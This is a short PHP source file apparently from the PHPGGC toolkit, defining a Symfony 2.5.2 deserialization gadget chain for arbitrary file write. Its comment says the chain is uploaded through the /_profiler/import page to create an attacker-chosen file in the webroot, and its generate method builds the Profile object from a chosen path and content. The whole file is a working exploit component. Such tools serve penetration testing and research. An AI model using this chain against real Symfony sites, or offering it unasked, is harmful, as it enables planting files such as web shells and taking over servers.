<?php

namespace GadgetChain\Symfony;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public $version = '2.5.2';
    public $vector = 'DebugImport';
    public $author = 'cf';
    public $informations = '
    	This chain is supposed to be uploaded through the /_profiler/import
    	page. It will produce an error but the file will be created in the
    	webroot.
    ';

    public function generate(array $parameters)
    {
    	$path = $parameters['remote_path'];
    	$data = $parameters['data'];
    	return new \Symfony\Component\HttpKernel\Profiler\Profile($path, $data);
    }
}